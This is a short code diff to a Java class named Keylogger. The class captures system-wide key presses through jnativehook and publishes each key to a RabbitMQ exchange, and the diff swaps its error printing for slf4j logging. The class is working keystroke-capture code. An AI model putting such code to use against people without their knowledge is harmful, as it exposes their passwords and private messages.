@@ -3,6 +3,9 @@ package com.mibef108287.app;
 import java.io.IOException;
 import java.sql.Timestamp;
 
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 import com.rabbitmq.client.Channel;
@@ -12,6 +15,7 @@ import com.rabbitmq.client.ConnectionFactory;
 public class Keylogger implements NativeKeyListener{
   private final String EXCHANGE_NAME = "strokes";
   private final int id = 1;
+  private final Logger logger = LoggerFactory.getLogger(Keylogger.class);
   private Channel channel; 
 
   public Keylogger() throws Exception{
@@ -28,8 +32,7 @@ public class Keylogger implements NativeKeyListener{
       String key = MyKeyEvent.getKeyText(nativeEvent.getKeyCode());
       channel.basicPublish(EXCHANGE_NAME,"",null,buildMessage(key, true).getBytes());
     } catch (IOException e) {
-      System.err.println(e);
-      // log this maybe
+      logger.error(e.getMessage());
     }
   }
 
@@ -38,9 +41,8 @@ public class Keylogger implements NativeKeyListener{
     try {
       String key = MyKeyEvent.getKeyText(nativeEvent.getKeyCode());
       channel.basicPublish(EXCHANGE_NAME,"",null,buildMessage(key, false).getBytes());
-    } catch (Exception e) {
-      System.err.println(e);
-      // log this maybe
+    } catch (IOException e) {
+      logger.error(e.getMessage());
     }
   }
 
